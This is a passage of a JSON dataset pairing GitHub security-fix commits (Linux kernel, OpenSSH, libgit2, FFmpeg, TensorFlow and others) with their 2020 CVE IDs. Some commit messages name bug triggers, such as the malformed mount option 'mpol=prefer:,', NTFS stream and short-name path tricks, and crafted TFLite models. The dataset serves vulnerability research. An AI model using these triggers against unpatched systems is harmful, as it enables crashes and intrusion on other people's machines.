    "body": "Using an empty (malformed) nodelist that is not caught during mount optionparsing leads to a stack-out-of-bounds access.The option string that was used was: \"mpol=prefer:,\". However,MPOL_PREFERRED requires a single node number, which is not being providedhere.Add a check that 'nodes' is not empty after parsing for MPOL_PREFERRED'snodeid.Fixes: 095f1fc (\"mempolicy: rework shmem mpol parsing and display\")Reported-by: Entropy Moe <3ntr0py1337@gmail.com>Reported-by: syzbot+b055b1a6b2b958707a21@syzkaller.appspotmail.comSigned-off-by: Randy Dunlap <rdunlap@infradead.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Tested-by: syzbot+b055b1a6b2b958707a21@syzkaller.appspotmail.comCc: Lee Schermerhorn <lee.schermerhorn@hp.com>Link: http://lkml.kernel.org/r/89526377-7eb6-b662-e1d8-4430928abde9@infradead.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2020-11565"
    ],
    "cveIdsCount": 1
  },
  "31d2aa21226c601f0edff83eb3ce3041087d80d87fb66c843c1ceb4e3c505eb4": {
    "url": "https://github.com/squid-cache/squid/commit/eeebf0f37a72a2de08348e85ae34b02c34e9a811",
    "title": "Fix auth digest refcount integer overflow (#585)",
    "body": "This fixes a possible overflow of the nonce reference counter in thedigest authentication scheme, found by security researchers@synacktiv.It changes `references` to be an 64 bits unsigned integer. This makesoverflowing the counter impossible in practice.",
    "cveIds": [
      "CVE-2020-11945"
    ],
    "cveIdsCount": 1
  },
  "af4c5defdac420a5ec2f84ddcaff73ab9f205416718be66643ea391f5bd091b8": {
    "url": "https://github.com/skvadrik/re2c/commit/c4603ba5ce229db83a2a4fb93e6d4b4e3ec3776a",
    "title": "Fix crash in lexer refill (reported by Agostino Sarubbo).",
    "body": "The crash happened in a rare case of a very long lexeme that doen't fitinto the buffer, forcing buffer reallocation.The crash was caused by an incorrect calculation of the shift offset(it was smaller than necessary). As a consequence, the data from bufferstart and up to the beginning of the current lexeme was not discarded(as it should have been), resulting in less free space for new data thanexpected.",
    "cveIds": [
      "CVE-2020-11958"
    ],
    "cveIdsCount": 1
  },
  "9201d73d59f0a085c77dcbde819d9dc3feb086347833b946aff7ff4b19871604": {
    "url": "https://github.com/gburton/CE-Phoenix/commit/8d0fb97810bc28880415a3a31607f473bfc5fec8",
    "title": "Harden _GET page parameter",
    "body": "TY to the guys at SISL Chicago",
    "cveIds": [
      "CVE-2020-12058"
    ],
    "cveIdsCount": 1
  },
  "54e748c54a6c033cddef16adf73fe390d40815d9dfbcbee0dd0053c31ea7ab94": {
    "url": "https://github.com/openssh/openssh-portable/commit/955854cafca88e0cdcd3d09ca1ad4ada465364a1",
    "title": "upstream: another case where a utimes() failure could make scp send",
    "body": "a desynchronising error; reminded by Aymeric Vincent ok deraadt markusOpenBSD-Commit-ID: 2ea611d34d8ff6d703a7a8bf858aa5dbfbfa7381",
    "cveIds": [
      "CVE-2020-12062"
    ],
    "cveIdsCount": 1
  },
  "cfd91759dc73a3da5c344caa867d1b166dfbadb41b8dbc99a30f67780db0d4f9": {
    "url": "https://github.com/openssh/openssh-portable/commit/aad87b88fc2536b1ea023213729aaf4eaabe1894",
    "title": "upstream: when receving a file in sink(), be careful to send at",
    "body": "most a single error response after the file has been opened. Otherwise thesource() and sink() can become desyncronised. Reported by Daniel Goujot,Georges-Axel Jaloyan, Ryan Lahfa, and David Naccache.ok deraadt@ markus@OpenBSD-Commit-ID: 6c14d233c97349cb811a8f7921ded3ae7d9e0035",
    "cveIds": [
      "CVE-2020-12062"
    ],
    "cveIdsCount": 1
  },
  "6db87c1e13a0f7df2b67ea18f920d4bbc72df7f2fd6036e46bd34cab75c5e869": {
    "url": "https://github.com/prasathmani/tinyfilemanager/commit/a0c595a8e11e55a43eeaa68e1a3ce76365f29d06",
    "title": "Security fix #357",
    "body": "Download file causes timeout #353Download Restart @ 88% #312download large file issues #259File upload issue #354FIle Upload URL error #360Bug in .tar archive extraction when destination(s) file(s) already exist (HTTP error 500) #332Backup File return false #201",
    "cveIds": [
      "CVE-2020-12102",
      "CVE-2020-12103"
    ],
    "cveIdsCount": 2
  },
  "e6f10d767cc7e40802bba08c8eba72448dc4bd2eccd782974ae554ed68dcfe33": {
    "url": "https://github.com/ArtifexSoftware/jbig2dec/commit/0726320a4b55078e9d8deb590e477d598b3da66e",
    "title": "Fix OSS-Fuzz issue 20332: buffer overflow in jbig2_image_compose.",
    "body": "With extreme values of x/y/w/h we can get overflow. Test for thisand exit safely.Thanks for OSS-Fuzz for reporting.",
    "cveIds": [
      "CVE-2020-12268"
    ],
    "cveIdsCount": 1
  },
  "5da21aa2cf56a5a929fd6916020b80e5938526a2bc7fcafed085a70f88036658": {
    "url": "https://github.com/libgit2/libgit2/commit/e1832eb20a7089f6383cfce474f213157f5300cb",
    "title": "path: also guard .gitmodules against NTFS Alternate Data Streams",
    "body": "We just safe-guarded `.git` against NTFS Alternate Data Stream-relatedattack vectors, and now it is time to do the same for `.gitmodules`.Note: In the added regression test, we refrain from verifying all kindsof variations between short names and NTFS Alternate Data Streams: asthe new code disallows _all_ Alternate Data Streams of `.gitmodules`, itis enough to test one in order to know that all of them are guardedagainst.Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>",
    "cveIds": [
      "CVE-2020-12278"
    ],
    "cveIdsCount": 1
  },
  "c2b3a0d71e5253dea1fb7243a3b10fd02478b5d077c567ad9df592ca6bf67354": {
    "url": "https://github.com/libgit2/libgit2/commit/3f7851eadca36a99627ad78cbe56a40d3776ed01",
    "title": "Disallow NTFS Alternate Data Stream attacks, even on Linux/macOS",
    "body": "A little-known feature of NTFS is that it offers to store metadata inso-called \"Alternate Data Streams\" (inspired by Apple's \"resourceforks\") that are copied together with the file they are associated with.These Alternate Data Streams can be accessed via `<file name>:<streamname>:<stream type>`.Directories, too, have Alternate Data Streams, and they even have adefault stream type `$INDEX_ALLOCATION`. Which means that `abc/` and`abc::$INDEX_ALLOCATION/` are actually equivalent.This is of course another attack vector on the Git directory that wedefinitely want to prevent.On Windows, we already do this incidentally, by disallowing colons infile/directory names.While it looks as if files'/directories' Alternate Data Streams are notaccessible in the Windows Subsystem for Linux, and neither viaCIFS/SMB-mounted network shares in Linux, it _is_ possible to accessthem on SMB-mounted network shares on macOS.Therefore, let's go the extra mile and prevent this particular attack_everywhere_. To keep things simple, let's just disallow *any* AlternateData Stream of `.git`.This is libgit2's variant of CVE-2019-1352.Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>",
    "cveIds": [
      "CVE-2020-12278"
    ],
    "cveIdsCount": 1
  },
  "90ee96f2760a445c6e2cc450bbd9e5afebf0aacbbb3433ef22a22b404bc9028b": {
    "url": "https://github.com/libgit2/libgit2/commit/64c612cc3e25eff5fb02c59ef5a66ba7a14751e4",
    "title": "Protect against 8.3 \"short name\" attacks also on Linux/macOS",
    "body": "The Windows Subsystem for Linux (WSL) is getting increasingly popular,in particular because it makes it _so_ easy to run Linux software onWindows' files, via the auto-mounted Windows drives (`C:\\` is mapped to`/mnt/c/`, no need to set that up manually).Unfortunately, files/directories on the Windows drives can be accessedvia their _short names_, if that feature is enabled (which it is on the`C:` drive by default).Which means that we have to safeguard even our Linux users against theshort name attacks.Further, while the default options of CIFS/SMB-mounts seem to disallowaccessing files on network shares via their short names on Linux/macOS,it _is_ possible to do so with the right options.So let's just safe-guard against short name attacks _everywhere_.Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>",
    "cveIds": [
      "CVE-2020-12279"
    ],
    "cveIdsCount": 1
  },
  "4f40b41cf1aebb09bb4ffc4b152cb3b57091ab4061cee21c45e44c6cf5e7351e": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/1812352d767ccf5431aa440123e2e260a4db2726",
    "title": "avcodec/cbs_jpeg: Check length for SOS",
    "body": "Fixes: out of array accessFixes: 19734/clusterfuzz-testcase-minimized-ffmpeg_BSF_TRACE_HEADERS_fuzzer-5673507031875584Fixes: 19353/clusterfuzz-testcase-minimized-ffmpeg_BSF_TRACE_HEADERS_fuzzer-5703944462663680Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/projects/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2020-12284"
    ],
    "cveIdsCount": 1
  },
  "f5ba48b456c69be410f36ab479f63164a883ddcac90f3fd7df98f62b43793043": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/a3a3730b5456ca00587455004d40c047f7b20a99",
    "title": "avcodec/cbs_jpeg: Check length for SOS",
    "body": "Fixes: out of array accessFixes: 19734/clusterfuzz-testcase-minimized-ffmpeg_BSF_TRACE_HEADERS_fuzzer-5673507031875584Fixes: 19353/clusterfuzz-testcase-minimized-ffmpeg_BSF_TRACE_HEADERS_fuzzer-5703944462663680Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/projects/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit 1812352)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2020-12284"
    ],
    "cveIdsCount": 1
  },
  "1e595ff0f0dd35b22a0dd93ddc70e85682352392224e723c0e21c23172d98663": {
    "url": "https://github.com/torvalds/linux/commit/056ad39ee9253873522f6469c3364964a322912b",
    "title": "USB: core: Fix free-while-in-use bug in the USB S-Glibrary",
    "body": "FuzzUSB (a variant of syzkaller) found a free-while-still-in-use bugin the USB scatter-gather library:BUG: KASAN: use-after-free in atomic_readinclude/asm-generic/atomic-instrumented.h:26 [inline]BUG: KASAN: use-after-free in usb_hcd_unlink_urb+0x5f/0x170drivers/usb/core/hcd.c:1607Read of size 4 at addr ffff888065379610 by task kworker/u4:1/27CPU: 1 PID: 27 Comm: kworker/u4:1 Not tainted 5.5.11 #2Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS1.10.2-1ubuntu1 04/01/2014Workqueue: scsi_tmf_2 scmd_eh_abort_handlerCall Trace: __dump_stack lib/dump_stack.c:77 [inline] dump_stack+0xce/0x128 lib/dump_stack.c:118 print_address_description.constprop.4+0x21/0x3c0 mm/kasan/report.c:374 __kasan_report+0x153/0x1cb mm/kasan/report.c:506 kasan_report+0x12/0x20 mm/kasan/common.c:639 check_memory_region_inline mm/kasan/generic.c:185 [inline] check_memory_region+0x152/0x1b0 mm/kasan/generic.c:192 __kasan_check_read+0x11/0x20 mm/kasan/common.c:95 atomic_read include/asm-generic/atomic-instrumented.h:26 [inline] usb_hcd_unlink_urb+0x5f/0x170 drivers/usb/core/hcd.c:1607 usb_unlink_urb+0x72/0xb0 drivers/usb/core/urb.c:657 usb_sg_cancel+0x14e/0x290 drivers/usb/core/message.c:602 usb_stor_stop_transport+0x5e/0xa0 drivers/usb/storage/transport.c:937This bug occurs when cancellation of the S-G transfer races withtransfer completion. When that happens, usb_sg_cancel() may continueto access the transfer's URBs after usb_sg_wait() has freed them.The bug is caused by the fact that usb_sg_cancel() does not take anysort of reference to the transfer, and so there is nothing to preventthe URBs from being deallocated while the routine is trying to usethem. The fix is to take such a reference by incrementing thetransfer's io->count field while the cancellation is in progres anddecrementing it afterward. The transfer's URBs are not deallocateduntil io->complete is triggered, which happens when io->count reacheszero.Signed-off-by: Alan Stern <stern@rowland.harvard.edu>Reported-and-tested-by: Kyungtae Kim <kt0755@gmail.com>CC: <stable@vger.kernel.org>Link: https://lore.kernel.org/r/Pine.LNX.4.44L0.2003281615140.14837-100000@netrider.rowland.orgSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2020-12464"
    ],
    "cveIdsCount": 1
  },
  "a578e0cd6c955b226a52422e0b473164a7da43bc8fa2dd8653a7e2f6fe5940ba": {
    "url": "https://github.com/roundcube/roundcubemail/commit/9bbda422ff0b782b81de59c86994f1a5fd93f8e6",
    "title": "Fix CSRF bypass that could be used to log out an authenticated user (#…",
    "body": "…7302)",
    "cveIds": [
      "CVE-2020-12626"
    ],
    "cveIdsCount": 1
  },
  "af73821303ea7209c640a4e9b58f81d0e71d6497b4eeabb0307df5a85a15a47f": {
    "url": "https://github.com/cherokee/webserver/releases",
    "title": "v1.2.104 … v1.2.101-GoPro … v1.2.103 … v1.2.102 … v1.2.99 … v1.2.98 … v1.2.2 … v1.2.0 … v1.0.21 …",
    "body": "Cherokee 1.2.104 Modifications made to v1.2.101 by GoPro for use with the WiFi BackPac Cherokee 1.2.103 Cherokee 1.2.102 Cherokee 1.2.99 Cherokee 1.2.98 Cherokee 1.2.2 Cherokee 1.2.0 Cherokee 1.0.21",
    "cveIds": [
      "CVE-2020-12845"
    ],
    "cveIdsCount": 1
  },
  "8df1647a03ba02485ee3ccd5e8a25bd2e82b98f6e343176d7be8079e82261bec": {
    "url": "https://github.com/libexif/libexif/commit/435e21f05001fb03f9f186fa7cbc69454afd00d1",
    "title": "Fix MakerNote tag size overflow issues at read time.",
    "body": "Check for a size overflow while reading tags, which ensures that thesize is always consistent for the given components and type of theentry, making checking further down superfluous.This provides an alternate fix forhttps://sourceforge.net/p/libexif/bugs/125/ CVE-2016-6328 and for allthe MakerNote types. Likely, this makes both commits 41bd042 and89e5b1c redundant as it ensures that MakerNote entries are well-formedwhen they're populated.Some improvements on top by Marcus Meissner <marcus@jet.franken.de>CVE-2020-13112",
    "cveIds": [
      "CVE-2020-13112"
    ],
    "cveIdsCount": 1
  },
  "05e846569692215cf4eb84aa0fe52561e111e3758ea1d04693e17bbbdfd3de78": {
    "url": "https://github.com/libexif/libexif/commit/ec412aa4583ad71ecabb967d3c77162760169d1f",
    "title": "Ensure the MakerNote data pointers are initialized with NULL.",
    "body": "This ensures that an uninitialized pointer isn't dereferenced later inthe case where the number of components (and therefore size) is 0.This fixes the second issue reported athttps://sourceforge.net/p/libexif/bugs/125/CVE-2020-13113",
    "cveIds": [
      "CVE-2020-13113"
    ],
    "cveIdsCount": 1
  },
  "9c6d24201fe4abbb068dd2b924c6999ebacf044346fac1604bf09214c2568a61": {
    "url": "https://github.com/MISP/MISP/commit/2989aa05225aa9b3a592ca50cbf8350ef256909c",
    "title": "fix: [security] xss in the resolved attributes view",
    "body": "- thanks to Jakub Onderka for reporting it",
    "cveIds": [
      "CVE-2020-13153"
    ],
    "cveIdsCount": 1
  },
  "5a78a123c36d6ab7307e58aea2f8df76673b5880fe4de95727ff7c5867f5daaf": {
    "url": "https://github.com/OS4ED/openSIS-Responsive-Design/commit/1127ae0bb7c3a2883febeabc6b71ad8d73510de8",
    "title": "Version 7.4 release update",
    "body": "Version 7.4 release update",
    "cveIds": [
      "CVE-2020-13380",
      "CVE-2020-13383"
    ],
    "cveIdsCount": 2
  },
  "10a2b5b7aa99c29dfca556d445aa3d12054d5bda0f39cac3835f857eb8800e24": {
    "url": "https://github.com/muttmua/mutt/commit/3e88866dc60b5fa6aaba6fd7c1710c12c1c3cd01",
    "title": "Prevent possible IMAP MITM via PREAUTH response.",
    "body": "This is similar to CVE-2014-2567 and CVE-2020-12398. STARTTLS is notallowed in the Authenticated state, so previously Mutt wouldimplicitly mark the connection as authenticated and skip anyencryption checking/enabling.No credentials are exposed, but it does allow messages to be sent toan attacker, via postpone or fcc'ing for instance.Reuse the $ssl_starttls quadoption \"in reverse\" to prompt to abort theconnection if it is unencrypted.Thanks very much to Damian Poddebniak and Fabian Ising from theMünster University of Applied Sciences for reporting this issue, andtheir help in testing the fix.",
    "cveIds": [
      "CVE-2020-14093"
    ],
    "cveIdsCount": 1
  },
  "05ca433d6806d2ea14435406d78b747dfc61adaa7bfed67a60a4871b313684c5": {
    "url": "https://github.com/KumbiaPHP/KumbiaPHP/releases",
    "title": "v1.0-RC2 …",
    "body": "Merge pull request #293 from KumbiaPHP/devv 1.0.0 Remove PHP_EOLWas redundant",
    "cveIds": [
      "CVE-2020-14146"
    ],
    "cveIdsCount": 1
  },
  "38e4d14aa999542fa47108abea382924a6744a136348ae71b29e175317eb8f75": {
    "url": "https://github.com/jerryscript-project/jerryscript/commit/c2b662170245a16f46ce02eae68815c325d99821",
    "title": "Fix adding entries to the internal buffer of a Map object (#3805)",
    "body": "When appending the key/value pair separately, garbage collection could betriggered before the value is added, which could cause problems duringmarking. This patch changes insertion to add both values at the sametime, which prevents partial entries from being present in the internalbuffer.Fixes #3804.JerryScript-DCO-1.0-Signed-off-by: Dániel Bátyai dbatyai@inf.u-szeged.hu",
    "cveIds": [
      "CVE-2020-14163"
    ],
    "cveIdsCount": 1
  },
  "565bd6058b212b72cf2d76b4f4b312773932d103828b0722338896d080a72491": {
    "url": "https://github.com/c-ares/c-ares/commit/1cc7e83c3bdfaafbc5919c95025592d8de3a170e",
    "title": "Prevent possible double-free in ares_getaddrinfo() if ares_destroy() …",
    "body": "…is calledIn the event that ares_destroy() is called prior to ares_getaddrinfo() completing,it would result in an invalid read and double-free due to calling end_hquery() twice.Reported By: Jann Horn @ Google Project Zero",
    "cveIds": [
      "CVE-2020-14354"
    ],
    "cveIdsCount": 1
  },
  "afbded4dddbc09b2bc0f3f68cf71baeb7886787a8578e86f8d83b4054a9b82f7": {
    "url": "https://github.com/LibVNC/libvncserver/commit/33441d90a506d5f3ae9388f2752901227e430553",
    "title": "libvncclient/tls_openssl: do not deref a NULL pointer",
    "body": "Happens in anonTLS mode where cred is NULL.re #347",
    "cveIds": [
      "CVE-2020-14396"
    ],
    "cveIdsCount": 1
  },
  "9263ca640ba7bf0f1228594414b656569db0dc8fee7a072c323f4ae807f7861e": {
    "url": "https://github.com/LibVNC/libvncserver/commit/a6788d1da719ae006605b78d22f5a9f170b423af",
    "title": "libvncserver: scale: cast to 64 bit before shifting",
    "body": "Since pixel_value is 64 bit the data type of the shift operand shouldbe 64 bit too to prevent integer overflows.",
    "cveIds": [
      "CVE-2020-14401"
    ],
    "cveIdsCount": 1
  },
  "1300aba376bed4ac9cb9dbf057e53aec8333982a5472945d8117cdfed8b47648": {
    "url": "https://github.com/tensorflow/tensorflow/commit/390611e0d45c5793c7066110af37c8514e6a6c54",
    "title": "Fix heap buffer overflow in tf.raw_ops.SparseFillEmptyRowsGrad.",
    "body": "Also add tests as they were lackingPiperOrigin-RevId: 332566071Change-Id: I44277578e26ff5fb3fdb0dcbba6e91b2ec3e7859",
    "cveIds": [
      "CVE-2020-15195"
    ],
    "cveIdsCount": 1
  },
  "bfbc09a1ba9036798a8cd7bc0580a401a8bc911b993c0cdc4e35057c79fadd4d": {
    "url": "https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02",
    "title": "Fix multiple vulnerabilities in tf.raw_ops.*CountSparseOutput.",
    "body": "Also add tests for these API points, both for the happy paths and for the vulnerable ones.PiperOrigin-RevId: 332563222Change-Id: Ib3b52116a83a134c2e742a7c66e5e956db8fba05",
    "cveIds": [
      "CVE-2020-15196",
      "CVE-2020-15197",
      "CVE-2020-15198",
      "CVE-2020-15199",
      "CVE-2020-15200",
      "CVE-2020-15201"
    ],
    "cveIdsCount": 6
  },
  "2a286dc171c7a8898185761f2d07982be56a3c3473224b67780d450a31640e37": {
    "url": "https://github.com/tensorflow/tensorflow/commit/33be22c65d86256e6826666662e40dbdfe70ee83",
    "title": "Prevent format string vulnerability in tf.strings.as_string.",
    "body": "The `printf` format specifier only allows `#`, `0`, `-`, `+` and space as flag characters. Others are interpreted as width/precision/length modifier or conversion specifiers. If a character does not fit into any of these sets `printf` just displays it.Also add a test suite for `tf.strings.as_string`. Also fix the issue where the flag character was used only if width was specified.PiperOrigin-RevId: 332553548Change-Id: Ie57cf2a7c14d1a36097642794c14329db669bbba",
    "cveIds": [
      "CVE-2020-15203"
    ],
    "cveIdsCount": 1
  },
  "7dc142fe940ac09147599587abbd5f19c20d0e92c6718dc946d499c6d85b615b": {
    "url": "https://github.com/tensorflow/tensorflow/commit/9a133d73ae4b4664d22bd1aa6d654fec13c52ee1",
    "title": "Prevent segfault in GetSessionHandle{,V2}.",
    "body": "In eager mode, session state is null.PiperOrigin-RevId: 332548597Change-Id: If094812c2e094044220b9ba28f7d7601be042f38",
    "cveIds": [
      "CVE-2020-15204"
    ],
    "cveIdsCount": 1
  },
  "88bf74861f8851185075ce7791d272d492fb179bc32c370602ed61200c2c795c": {
    "url": "https://github.com/tensorflow/tensorflow/commit/0462de5b544ed4731aa2fb23946ac22c01856b80",
    "title": "Validate data_splits for tf.StringNGrams.",
    "body": "Without validation, we can cause a heap buffer overflow which results in data leakage and/or segfaults.PiperOrigin-RevId: 332543478Change-Id: Iee5bda24497a195d09d122355502480830b1b317",
    "cveIds": [
      "CVE-2020-15205"
    ],
    "cveIdsCount": 1
  },
  "8bcb88be4491651a632c98d0ad6d5fb49a51bd7dff511771239e64103ca23e0d": {
    "url": "https://github.com/tensorflow/tensorflow/commit/adf095206f25471e864a8e63a0f1caef53a0e3a6",
    "title": "Validate NodeDefs from FunctionDefLibrary of a GraphDef.",
    "body": "We already validated `NodeDef`s from a `GraphDef` but missed validating those from the `FunctionDefLibrary`. Thus, some maliciously crafted models could evade detection and cause denial of service due to a `CHECK`-fail.PiperOrigin-RevId: 332536309Change-Id: I052efe919ff1fe2f90815e286a1aa4c54c7b94ff",
    "cveIds": [
      "CVE-2020-15206"
    ],
    "cveIdsCount": 1
  },
  "73b203d61f088bf15bb2bb6e356848e667adb2660e43589a2cb8a68e1d4d1af9": {
    "url": "https://github.com/tensorflow/tensorflow/commit/2d88f470dea2671b430884260f3626b1fe99830a",
    "title": "[tflite] Ensure ResolveAxis properly handles negative inputs.",
    "body": "In Python, a list `l` of length `n` allows indexing with negative indices, `l[i]`. The only constraint is that `n + i` becomes positive. Code in `ResolveAxis` assumes the constraints and only checks it using a `DCHECK`. But the macro is a no-op in non-debug builds and that can result in reading from negative offsets (buffer underflows).PiperOrigin-RevId: 332530683Change-Id: I464e073fee618054ae3719a3679739007bb3f3bc",
    "cveIds": [
      "CVE-2020-15207"
    ],
    "cveIdsCount": 1
  },
  "2ee8c6ac2179260e39553b3d62696350e52010895c83ab4be9d2b58dab9103f1": {
    "url": "https://github.com/tensorflow/tensorflow/commit/8ee24e7949a203d234489f9da2c5bf45a7d5157d",
    "title": "[tflite] Ensure MatchingDim does not allow buffer overflow.",
    "body": "We check in `MatchingDim` that both arguments have the same dimensionality, however that is a `DCHECK` only enabled if building in debug mode. Hence, it could be possible to cause buffer overflows by passing in a tensor with larger dimensions as the second argument. To fix, we now make `MatchingDim` return the minimum of the two sizes.A much better fix would be to return a status object but that requires refactoring a large part of the codebase for minor benefits.PiperOrigin-RevId: 332526127Change-Id: If627d0d2c80a685217b6e0d1e64b0872dbf1c5e4",
    "cveIds": [
      "CVE-2020-15208"
    ],
    "cveIdsCount": 1
  },
  "41893abc2bdfd05c58accda4df72485355d21ab30532cf2cc144e2508c779445": {
    "url": "https://github.com/tensorflow/tensorflow/commit/0b5662bc2be13a8c8f044d925d87fb6e56247cd8",
    "title": "[tflite] Ensure input tensors don't have nullptr buffers.",
    "body": "A crafted TFLite model can force a node to have as input a tensor backed by a `nullptr` buffer. That is, by carefully changing the buffer index in the flatbuffer serialization, we can force the TFLite interpreter to consider a read-only tensor to be a read-write one and assume that there is an operator that has this tensor as output, writing to it and allocating memory before the tensor is used as input. If this does not happen, we get memory corruption.PiperOrigin-RevId: 332524692Change-Id: I57ef175152a29020af9ab041dc959e5631dce40f",
    "cveIds": [
      "CVE-2020-15209"
    ],
    "cveIdsCount": 1
  },
  "3a615a68c8cc94d5ad2d2e339e334c97a326d168d510378e8adc5d0f3b0f1d11": {
    "url": "https://github.com/tensorflow/tensorflow/commit/d58c96946b2880991d63d1dacacb32f0a4dfa453",
    "title": "[tflite] Ensure inputs and outputs don't overlap.",
    "body": "If a model uses the same tensor for both an input and an output then this can result in data loss and memory corruption. This should not happen.PiperOrigin-RevId: 332522916Change-Id: If0905b142415a9dfceaf2d181872f2a8fb88f48a",
    "cveIds": [
      "CVE-2020-15210"
    ],
    "cveIdsCount": 1
  },
  "e219c70104564f847fb6537b636a556332e37b6ff8120e322830b77c17a63b55": {
    "url": "https://github.com/tensorflow/tensorflow/commit/e11f55585f614645b360563072ffeb5c3eeff162",
    "title": "[tflite]: Insert nullptr checks when obtaining tensors.",
    "body": "As part of ongoing refactoring, `tflite::GetInput`, `tflite::GetOutput`, `tflite::GetTemporary` and `tflite::GetIntermediates` will return `nullptr` in some cases. Hence, we insert the `nullptr` checks on all usages.We also insert `nullptr` checks on usages of `tflite::GetVariableInput` and `tflite::GetOptionalInputTensor` but only in the cases where there is no obvious check that `nullptr` is acceptable (that is, we only insert the check for the output of these two functions if the tensor is accessed as if it is always not `nullptr`).PiperOrigin-RevId: 332517854Change-Id: Ic27221dd1f0fbe302f311c2fe5a846ed8ff02016",
    "cveIds": [
      "CVE-2020-15211"
    ],
    "cveIdsCount": 1
  },
  "406c429e6a3818d3e4349e87170b9680bf15d4f0a267ada273cd69ac684d17ff": {
    "url": "https://github.com/tensorflow/tensorflow/commit/cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f",
    "title": "[tflite]: Insert nullptr checks when obtaining tensors.",
    "body": "As part of ongoing refactoring, `tflite::GetInput`, `tflite::GetOutput`, `tflite::GetTemporary` and `tflite::GetIntermediates` will return `nullptr` in some cases. Hence, we insert the `nullptr` checks on all usages.We also insert `nullptr` checks on usages of `tflite::GetVariableInput` and `tflite::GetOptionalInputTensor` but only in the cases where there is no obvious check that `nullptr` is acceptable (that is, we only insert the check for the output of these two functions if the tensor is accessed as if it is always not `nullptr`).PiperOrigin-RevId: 332518902Change-Id: I92eb164a6101ac3cca66090061a9b56a97288236",
    "cveIds": [
      "CVE-2020-15211"
    ],
    "cveIdsCount": 1
  },
  "a38dcf1ea34003f45778ac1221d99ec29bc59874598ea29bd824f2c09964d220": {
    "url": "https://github.com/tensorflow/tensorflow/commit/46d5b0852528ddfd614ded79bccc75589f801bd9",
    "title": "[tflite] Test for kTfLiteOptionalTensor in GetInput.",
    "body": "`GetInput`, `GetVariableInput` and `GetOutput` all fail to check for the case where `node->inputs->data[index]` is the special `kTfLiteOptionalTensor` value (-1) which then causes `context->tensors[node->inputs->data[index]]` to read from invalid memory location.This fix makes `GetInput` and related return `nullptr` in those cases, asking the caller to check for `nullptr`. This is better than having `GetOptionalInputTensor` and `GetOptionalOutputTensor` (does not exist but could be added) as using the patched `GetInput` in error would be caught by a sanitizer test in the default optimized build (due to the `-fsanitize=null` option).PiperOrigin-RevId: 332512190Change-Id: Iabca54da2f2de02b6ece3c38b54f76d4277d689e",
    "cveIds": [
      "CVE-2020-15211"
    ],
    "cveIdsCount": 1
  },
  "17319241eb129f2d1c0ff36736202828cee618f09e429c0b12b39de76b58164d": {
    "url": "https://github.com/tensorflow/tensorflow/commit/00302787b788c5ff04cb6f62aed5a74d936e86c0",
    "title": "[tflite] Make GetOptionalInputTensor the same as GetInput.",
    "body": "With the previous change, there is no more need for two separate APIs. We would deprecate `GetOptionalInputTensor` in the future.PiperOrigin-RevId: 332513386Change-Id: Id7110271c25ebd6126ad8c82a493e37e0e0756b3",
    "cveIds": [
      "CVE-2020-15211"
    ],
    "cveIdsCount": 1
  },
  "b4ad73f47affce9ac3fd9378655f891b64ed30fb7d82f2008ce361fae1b05d37": {
    "url": "https://github.com/tensorflow/tensorflow/commit/fff2c8326280c07733828f990548979bdc893859",
    "title": "[tflite]: Insert nullptr checks when obtaining tensors.",
    "body": "As part of ongoing refactoring, `tflite::GetInput`, `tflite::GetOutput`, `tflite::GetTemporary` and `tflite::GetIntermediates` will return `nullptr` in some cases. Hence, we insert the `nullptr` checks on all usages.We also insert `nullptr` checks on usages of `tflite::GetVariableInput` and `tflite::GetOptionalInputTensor` but only in the cases where there is no obvious check that `nullptr` is acceptable (that is, we only insert the check for the output of these two functions if the tensor is accessed as if it is always not `nullptr`).PiperOrigin-RevId: 332520146Change-Id: I405d986cfc653aaafcfdf4162c0acbd46220b921",
    "cveIds": [
      "CVE-2020-15211"
    ],
    "cveIdsCount": 1
  },
  "316b78d83bac026393e1118c17afd4c5b3313df15c73f3f978d03dde35edabdb": {
    "url": "https://github.com/tensorflow/tensorflow/commit/1970c2158b1ffa416d159d03c3370b9a462aee35",
    "title": "[tflite]: Insert nullptr checks when obtaining tensors.",
    "body": "As part of ongoing refactoring, `tflite::GetInput`, `tflite::GetOutput`, `tflite::GetTemporary` and `tflite::GetIntermediates` will return `nullptr` in some cases. Hence, we insert the `nullptr` checks on all usages.We also insert `nullptr` checks on usages of `tflite::GetVariableInput` and `tflite::GetOptionalInputTensor` but only in the cases where there is no obvious check that `nullptr` is acceptable (that is, we only insert the check for the output of these two functions if the tensor is accessed as if it is always not `nullptr`).PiperOrigin-RevId: 332521299Change-Id: I29af455bcb48d0b92e58132d951a3badbd772d56",
    "cveIds": [
      "CVE-2020-15211"
    ],
    "cveIdsCount": 1
  },
  "f5b84e52f8e8ee9fdda8d6223f3253ce934a7171b9a466a3036b3ad6b2449a63": {
    "url": "https://github.com/tensorflow/tensorflow/commit/204945b19e44b57906c9344c0d00120eeeae178a",
    "title": "[tflite] Validate segment ids for segment_sum.",
    "body": "Segment identifiers in segment_sum should be in a 1-D tensor of same size as the first dimension of the input. The values of the tensor should be integers from {0, 1, 2, ... k-1}, where k is the first dimension of the input. The segment identifiers must not contain jumps and must be increasing.See https://www.tensorflow.org/api_docs/python/tf/math#Segmentation as the source for these constraints.PiperOrigin-RevId: 332510942Change-Id: I898beaba00642c918bcd4b4d4ce893ebb190d869",
    "cveIds": [
      "CVE-2020-15212",
      "CVE-2020-15213",
      "CVE-2020-15214"
    ],
    "cveIdsCount": 3
  },
